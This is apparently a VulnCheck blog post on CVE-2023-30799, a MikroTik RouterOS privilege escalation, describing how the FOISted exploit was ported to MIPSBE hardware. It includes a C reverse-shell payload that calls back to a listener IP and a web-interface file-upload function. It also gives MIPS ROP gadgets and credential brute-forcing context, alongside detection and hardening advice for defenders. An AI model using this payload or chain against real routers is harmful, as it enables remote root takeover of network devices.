---
title: "Exploiting MikroTik RouterOS Hardware with CVE-2023-30799 - Blog - VulnCheck"
date: 2023-07-25T00:00:00.000Z
draft: false
type: posts
categories: 
- 
---
# Exploiting MikroTik RouterOS Hardware with CVE-2023-30799 - Blog - VulnCheck

<br/>

<br/>
Up until version 6.49.8 (July 20, 2023), MikroTik \[RouterOS\](https://mikrotik.com/software) Long-term was vulnerable to \[CVE-2023-30799\](https://nvd.nist.gov/vuln/detail/CVE-2023-30799). Remote and authenticated attackers can use the vulnerability to get a root shell on the router.\\n\\n::youtube-video\\n---\\nid: kLC1fuGqDJY\\ntitle: Demonstration of CVE-2023-30799 on MikroTik RouterOS 6.48.7 MIPSBE\\n---\\n::\\n\\nCVE-2023-30799 was first disclosed, without a CVE, in \[June 2022\](https://recon.cx/2022/conference.html) at \[REcon\](https://www.youtube.com/watch?v=zLAQhIc7GJI) by \[Margin Research\](https://margin.re/) employees, Ian Dupont and \[Harrison Green\](https://twitter.com/hgarrereyn). At that time, they released an exploit called \[FOISted\](https://github.com/MarginResearch/FOISted) that can obtain a root shell on the RouterOS x86 virtual machine. A CVE was assigned last week (July 19, 2023) when VulnCheck researchers published new exploits that attacked a wider range of MikroTik hardware. \\n\\nMikroTik has been aware of the issue for some time. In October 2022, they fixed the problem in RouterOS stable (6.49.7). The release notes don’t indicate a security problem was addressed, but this tidbit alludes to the fix:\\n\\n> \*) system - improved handling of user policies; \\n\\nA patch for RouterOS Long-term only arrived after VulnCheck reached out to the vendor. On July 18, VulnCheck found that RouterOS Long-term 6.48.6 (the most recent Long-term at the time) was the second most installed RouterOS version according to \[Shodan\](https://www.shodan.io/search/facet?query=os%3A%22RouterOS%22&facet=os).\\n\\n> Top 10 RouterOS Versions (Shodan on July 18, 2023)\\n\\n::bar-chart\\n---\\nlabels:\\n - 6.49.7\\n - 6.48.6\\n - 6.49.6\\n - 6.49.8\\n - 6.47.10\\n - 6.45.9\\n - 6.48.3\\n - 6.47.9\\n - 6.49.2\\nvalues:\\n - 168649\\n - 163274\\n - 107133\\n - 71634\\n - 47518\\n - 46751\\n - 41266\\n - 38163\\n - 35315\\n---\\n::\\n\\nIn total, Shodan indexes approximately \[500,000\](https://www.shodan.io/search?query=title%3A%22RouterOS+router+configuration+page%22+-%22X-Frame-Options%22++-os%3A%22MikroTik+RouterOS+6.49.7%22+-os%3A%22MikroTik+RouterOS+6.49.8%22) and \[900,000\](https://www.shodan.io/search?query=product%3A%22MikroTik+Winbox%22+-os%3A%22MikroTik+RouterOS+6.49.7%22+-os%3A%22MikroTik+RouterOS+6.49.8%22+) RouterOS systems vulnerable to CVE-2023-30799 via their web and/or Winbox interfaces respectively.\\n\\n!\[Mikrotik web on Shodan\](/blog/mikrotik-foisted-revisited/mt-web-shodan.png){:width="100%"}\\n\\nWhich means that the vulnerability could have far reaching effects.\\n\\n## Authentication Required, But Still Dangerous\\n\\nCVE-2023-30799 does require authentication. In fact, the vulnerability itself is a simple privilege escalation from admin to “super-admin” which results in access to an arbitrary function call. But this vulnerability should not be dismissed because authentication is required. We believe that this is a dangerous vulnerability. Acquiring credentials to RouterOS systems is easier than one might expect.\\n\\nRouterOS ships with a fully functional “admin” user. \[Hardening guidance\](https://wiki.mikrotik.com/wiki/Manual:Securing\_Your\_Router) tells administrators to delete the “admin” user, but we know a large number of installations haven’t. We know this because the Winbox authentication scheme is vulnerable to a classic example of observable response discrepancy (\[CWE-204\](https://cwe.mitre.org/data/definitions/204.html)). During authentication, RouterOS will send a smaller response when the provided username doesn’t exist.\\n\\n!\[Winbox responses to login attempts\](/blog/mikrotik-foisted-revisited/mt-winbox-leak.png){:width="100%"}\\n\\nWe \[probed\](https://gist.github.com/j-baines/c484fc2988123bc4626efea74c316615) a sample of hosts on Shodan (n=5500) and found that nearly 60% still used the default \`admin\` user.\\n\\nTo make matters worse, the default “admin” password is an empty string, and it wasn’t until RouterOS 6.49 (October 2021) that RouterOS started prompting administrators to update blank passwords. Even when an administrator has set a new password, RouterOS doesn’t enforce any restrictions. Administrators are free to set any password they choose, no matter how simple. That’s particularly unfortunate because the system doesn’t offer any brute force protection (except on the SSH interface).\\n\\nIt’s not as if brute force attacks on RouterOS are unheard of, either. There's a \[RouterOS API\](https://help.mikrotik.com/docs/display/ROS/API) brute forcing tool that’s over a decade old. \[Greynoise\](https://viz.greynoise.io/tag/routeros-bruteforcer-attempt?days=30) shows that RouterOS API brute forcing is incredibly active.\\n\\n!\[Greynoise RouterOS Bruteforcer Tag\](/blog/mikrotik-foisted-revisited/greynoise-mt-bruteforce.png){:width="100%"}\\n\\n\[Shodan\](https://www.shodan.io/search?query=product%3A%22MikroTik+RouterOS+API+Service%22) shows far fewer routers expose their API port (~400,000) compared to the web or Winbox interfaces, so it’s useful to note that web and Winbox brute forcing \[tools\](https://github.com/tenable/routeros/tree/master/brute\_force) have existed since 2019. Although they became obsolete when MikroTik changed their authentication schemes around RouterOS 6.45.\\n\\nHowever, because Margin Research reverse-engineered the newest web interface authentication, we are free to resume brute force activities on that interface once again. To demonstrate that, we quickly threw together a simple dictionary brute force \[tool\](https://github.com/j-baines/even-you-brutus) that works against RouterOS versions up to the latest 6.x release. Below is a screenshot of the logs from an attacked router. Note that the router saw multiple login attempts every second from the same source.\\n\\n!\[Brute force login attempts\](/blog/mikrotik-foisted-revisited/bruteforce-logs.png){:width="100%"}\\n\\nAll of this is to say, RouterOS suffers from a variety of issues that make guessing administrative credentials easier than it should be. We believe CVE-2023-30799 is much easier to exploit than the CVSS vector indicates.\\n\\n## Why Did This Fly Under the Radar?\\n\\nMargin Research’s FOISted exploit, while well done, only works on the RouterOS x86 virtual machine, which is likely the least deployed version of the software. Perhaps this is what elicited the lackluster response from the vendor. FOISted would have received more attention if it was developed for MikroTik hardware. Successful attacks on hardware are a big deal, because they have widespread real-world applications. Exploiting the x86 VM does not.\\n\\nTo our knowledge, there hasn’t been a public method for obtaining a root shell on MikroTik hardware for quite some time. There were several methods up until RouterOS 6.46 (2019), but they’ve all been stomped out. \[CVE-2021-41987\](https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/) was used in the wild for a time (no public exploit), but that’s been fixed for two years now. More recently, during pwn2own, DEVCORE team members popped RouterOS with \[CVE-2023-32154\](https://www.zerodayinitiative.com/advisories/ZDI-23-710/), but exploitation requires IPv6 to be enabled, and the attacker be on the same network (also no public exploit).\\n\\nMIPSBE is likely the most popular architecture for MikroTik hardware (although they also have various devices that use MIPSLE, ARM, and PowerPC), so we took on the task of porting the exploit to MIPSBE.\\n\\n## Simplification and Practical Issues\\n\\nOur first step to porting FOISted was to simplify the exploit. This is a general outline of how FOISted x86 works:\\n\\n1. Upload a stage2 executable and a statically linked busybox via FTP.\\n2. Craft a ROP Chain:\\n\\n a. Using a write primitive, write /flash/rw/disk/stage2 to a predefined memory location.\\n\\n b. Calculate addresses of \`chmod\` and \`execl\` in uclibc using the offsets from \`close\`.\\n\\n c. \`chmod(“/flash/rw/disk/stage2”, 777)\`\\n\\n d. \`execve(“/flash/rw/disk/stage2”, NULL, NULL)\`\\n\\n3. Stage2 makes the uploaded busybox executable\\n4. Stage2 creates a bindshell using the uploaded busybox\\n\\nThere is a significant amount of register shuffling in order to achieve all of that. We settled on a far easier approach. We save ourselves a lot of trouble by changing the stage2 executable to a shared object. This allows us to skip \`chmod\`, and replace \`execve\` with \`dlopen\`. \`dlopen\` is referenced by the vulnerable binary (\`/nova/bin/www\`) so offsets into uclibc don’t have to be calculated. We can execute arbitrary code via \`dlopen\` by creating a function with a \[constructor attribute\](https://gcc.gnu.org/onlinedocs/gcc-4.7.0/gcc/Function-Attributes.html). Something like this:\\n\\n\`\`\`c\\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n#include \\n\\nstatic void before\_main(void) \_\_attribute\_\_((constructor));\\n\\nstatic void before\_main(void)\\n{\\n chmod("/flash/rw/disk/busybox", 0777);\\n struct sockaddr\_in sa;\\n int s;\\n\\n sa.sin\_family = AF\_INET;\\n sa.sin\_addr.s\_addr = inet\_addr("10.12.70.252");\\n sa.sin\_port = htons(1270);\\n\\n s = socket(AF\_INET, SOCK\_STREAM, 0);\\n connect(s, (struct sockaddr \*)&sa, sizeof(sa));\\n dup2(s, 0);\\n dup2(s, 1);\\n dup2(s, 2);\\n\\n char \* const argv\[\] = { "/flash/rw/disk/busybox", "ash", "-i", NULL };\\n execve("/flash/rw/disk/busybox", argv, NULL);\\n}\\n\`\`\` \\n\\nWith those changes, the x86 exploit is simplified to this:\\n\\n1. Upload a stage2 executable and a statically linked busybox via FTP.\\n2. Craft a ROP Chain:\\n\\n a. Using a write primitive, write /flash/rw/disk/stage2 to a predefined memory location\\n\\n b. Call \`dlopen(“/flash/rw/disk/stage2, 1)\`\\n3. Stage2 makes the uploaded busybox executable\\n4. Stage2 creates a bindshell using the uploaded busybox\\n\\nThere are still some issues here, though. The exploit isn’t practical for most real-world scenarios. Specifically:\\n\\n1. Most real world targets don’t expose the FTP interface.\\n2. A bindshell is typically going to be blocked/filtered and inaccessible.\\n\\nBoth issues are fairly easy to solve. First, the RouterOS web interface allows authenticated users to upload files to a persistent storage area. Nothing is straightforward when it comes to RouterOS, but the file upload logic is fairly reasonable, and we were able to work it into Margin Research’s \[webfig.py\](https://github.com/MarginResearch/FOISted/blob/master/webfig.py) seamlessly.\\n\\n\`\`\`python\\ndef upload(self, filename: bytes, data: bytes):\\n enc = self.tx.encrypt(filename) + self.tx.encrypt(b'\\x20' \* 8)\\n enc = web\_encode(enc)\\n packed = self.tracker.pack(enc)\\n param = urllib.parse.quote(packed)\\n\\n files = {'file': (filename, data)}\\n\\n r = requests.post(url = "http://" + self.host + "/jsproxy/upload?" + param, files=files)\\n if r.status\_code != 200:\\n print(r.content)\\n raise ValueError(f'Status code: {r.status\_code}')\\n\`\`\`\\n\\nThe bind shell issue is also trivial. We simply changed “stage2” to send out a single reverse shell (see the C code above). This has the added benefit of cleanly exiting when the attacker is done with the reverse shell, which allows \`www\` to respawn (and prevents an autosupout.rif from being generated).\\n\\n## Finding a MIPS ROP Chain\\n\\nNow with a simplified approach, the individual MIPS gadgets become easy to find. The ROP chain is generally reduced to:\\n\\n1. Move \`$sp\` to attacker controlled data.\\n2. Move an attacker controlled filename to \`$a0\`.\\n3. Call \`dlopen\`.\\n\\nThe gadgets can be reliably found in three functions for all the versions of RouterOS we tested (6.40 up to 6.49.6): \`main\`, \`www::Server::get\`, and \`loadServlet\`. First, to move \`$sp\` to the attacker controlled data, we can use the epilogue of \`main\`:\\n\\n\`\`\`asm\\n0x0040acbc <+728>: lw ra,1540(sp)\\n0x0040acc0 <+732>: lw s1,1536(sp)\\n0x0040acc4 <+736>: lw s0,1532(sp)\\n0x0040acc8 <+740>: move v0,zero\\n0x0040accc <+744>: jr ra\\n0x0040acd0 <+748>: addiu sp,sp,1544\\n\`\`\`\\n\\nThen to move an attacker controlled string into $a0 we use the epilogue of \`www::Server::get\`:\\n\\n\`\`\`asm\\n0x0040c514 <+620>: addiu a0,sp,44\\n0x0040c518 <+624>: lw ra,76(sp)\\n0x0040c51c <+628>: move v0,s1\\n0x0040c520 <+632>: lw s4,72(sp)\\n0x0040c524 <+636>: lw s3,68(sp)\\n0x0040c528 <+640>: lw s2,64(sp)\\n0x0040c52c <+644>: lw s1,60(sp)\\n0x0040c530 <+648>: lw s0,56(sp)\\n0x0040c534 <+652>: jr ra\\n0x0040c538 <+656>: addiu sp,sp,80\\n\`\`\`\\n\\nFinally, to call into \`dlopen\`, we opted to use a call via \`loadServlet\` instead of calling it directly.\\n\\n\`\`\`asm\\n0x00412480 <+344>: jal 0x4084a0 \\n0x00412484 <+348>: addiu a0,a0,4\\n\`\`\`\\n\\nCombined, they create a fairly simple ROP chain that results in loading the malicious shared object and sending a reverse shell to the attacker.\\n\\n\\n## Detection and Prevention\\n\\nAs we’ve seen, exploitation of CVE-2023-30799 on hardware turned out to be quite easy. Given RouterOS’ long history of being an APT target, combined with the fact that FOISted was released well over a year ago, we have to assume we aren’t the first group to figure this out. \\n\\nUnder normal circumstances, we’d say detection of exploitation is a good first step to protecting your systems. Unfortunately, detection is nearly impossible. The RouterOS web and Winbox interfaces implement custom encryption schemes that neither Snort or Suricata can decrypt and inspect. Once an attacker is established on the device, they can easily make themselves invisible to the RouterOS UI. Microsoft \[published\](https://github.com/microsoft/routeros-scanner) a toolset that identifies potential malicious configuration changes, but configuration changes aren’t necessary when the attacker has root access to the system. \\n\\nThe best time to catch the attacker is during brute force attempts (if that approach is used) or when malicious ELF binaries are uploaded to the device. Although neither of those are specific to CVE-2023-30799.\\n\\nPrevention is the best course of action. There are a few things administrators can do to protect themselves:\\n\\n1. Remove MikroTik administrative interfaces from the internet.\\n2. \[Restrict\](​​https://wiki.mikrotik.com/wiki/Manual:Securing\_Your\_Router#Access\_by\_IP\_address) which IP addresses administrators can login from.\\n3. Disable the Winbox and the web interfaces. Only use SSH for administration.\\n4. Configure SSH to use \[public/private keys\](https://wiki.mikrotik.com/wiki/Use\_SSH\_to\_execute\_commands\_(public/private\_key\_login)) and disable passwords.\\n\\nOtherwise, administrators should upgrade to 6.49.8 (stable) or the most recent 7.x stable.\\n\\n## About VulnCheck\\n\\nVulnCheck’s interest in CVE-2023-30799 was the result of cross-team activities. Our \[Exploit Intelligence\](https://vulncheck.com/product/exploit-intelligence) team flagged the FOISted exploit, our \[Initial Access\](https://vulncheck.com/product/initial-access-intelligence) team wrote a new exploit, and our \[CNA team\](https://vulncheck.com/advisories/report) issued the CVE. \\n\\nIf you are aware of an exploit that lacks an associated CVE, please \[contact\](https://vulncheck.com/advisories/report) our CNA team to get a CVE assigned. We also encourage you to submit public exploits hosted on GitHub to \[VulnCheck XDB\](https://vulncheck.com/xdb).\\n\\nIf you are as interested in exploits as we are, register for a VulnCheck account today by clicking “Sign in /Register” and schedule a demo.\\n

#### [Source](https://vulncheck.com/blog/mikrotik-foisted-revisited)

<br/>
---
